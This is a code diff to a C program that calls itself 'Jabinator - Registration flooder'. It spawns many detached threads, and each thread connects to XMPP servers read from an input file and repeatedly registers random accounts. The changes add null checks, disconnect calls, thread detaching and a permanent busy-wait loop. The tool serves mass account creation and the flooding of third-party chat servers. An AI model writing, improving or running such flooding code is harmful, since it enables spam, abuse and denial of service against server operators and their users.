@@ -14,7 +14,7 @@
 
 #include <hdr/global.h>
 
-GMainContext *main_context;
+//GMainContext *main_context = NULL;
 
 static gchar *xmppsfile = NULL;
 static gchar *authsoutfile = NULL;
@@ -34,28 +34,33 @@ static GOptionEntry entries[] =
     { NULL }
 };
 
-void *thread_register(void *line)
+void thread_register(void *line)
 {
     gint cycle;
-    LmConnection *lconnection;
+    LmConnection *lconnection = NULL;
 
     gchar *pubserv = strtok(line, "|");
     gchar *conserv = strtok(NULL, "|");
     gchar *conport = strtok(conserv, ":");
     conport = strtok(NULL, ":");
 
+    if(!pubserv || !conserv || !conport)
+        return;
+
     printf("pubserv: %s, conserv: %s, conport: %s\n", pubserv, conserv, conport);
 
     gint jconport = atoi(conport);
 
-    main_context = g_main_context_new();
+    //main_context = g_main_context_new();
 
     lconnection = xmpp_connect(pubserv, conserv, jconport, NULL, NULL, NULL, FALSE);
 
     for(cycle = 0; cycle < numcycles; cycle++)
+    {
         xmpp_register_rand(pubserv, conserv, conport, authsoutfile, lconnection);
-
-    return 0;
+        xmpp_disconnect(lconnection);
+    }
+    return;
 }
 
 int main(int argc, char **argv)
@@ -65,7 +70,7 @@ int main(int argc, char **argv)
     ssize_t read;
     char *line = NULL;
 
-    GOptionContext *context;
+    GOptionContext *context = NULL;
 
     context = g_option_context_new("- Jabinator - Registration flooder");
     g_option_context_add_main_entries(context, entries, NULL);
@@ -94,8 +99,14 @@ int main(int argc, char **argv)
         line[strcspn(line, "\n")] = 0;
 
         for(i = 0; i < numthreads; i++)
-            pthread_create(&thread[i], NULL, thread_register, (void*)line);
+        {
+            pthread_create(&thread[i], NULL, (void*)&thread_register, (void*)line);
+            pthread_detach(thread[i]);
+            //g_usleep(1000000);
+        }
     }
+
+    while(1);
 
     return EXIT_SUCCESS;
 }
